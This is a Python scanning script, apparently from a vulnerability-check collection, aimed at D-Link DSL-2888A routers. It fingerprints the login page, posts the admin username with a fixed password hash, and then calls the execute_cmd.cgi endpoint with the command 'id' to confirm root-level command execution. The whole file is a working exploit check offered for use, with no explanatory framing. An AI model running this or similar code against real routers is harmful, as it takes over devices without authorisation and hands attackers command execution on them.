import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"page/login/login.html"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/html" in response.headers["Content-Type"] and "var ModelName=\"DSL-2888A\";" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "text/html" in response.headers["Content-Type"] and "var ModelName=\"DSL-2888A\";" in response.text:
			r0=True
		else:
			r0=False
	url=baseurl
	body="username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.headers["location"] == "/page/login/login_fail.html":
				f_list.append(1)
		if len(f_list)==1:
			r1=True
		else:
			r1=False
	else:
		if response.headers["location"] == "/page/login/login_fail.html":
			r1=True
		else:
			r1=False
	url=baseurl+"cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "text/html" in response.headers["Content-Type"] and "uid=0(admin) gid=0(admin)" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r2=True
		else:
			r2=False
	else:
		if response.status_code == 200 and "text/html" in response.headers["Content-Type"] and "uid=0(admin) gid=0(admin)" in response.text:
			r2=True
		else:
			r2=False
	if r0 and r1 and r2:
		return True
	else:
		return False
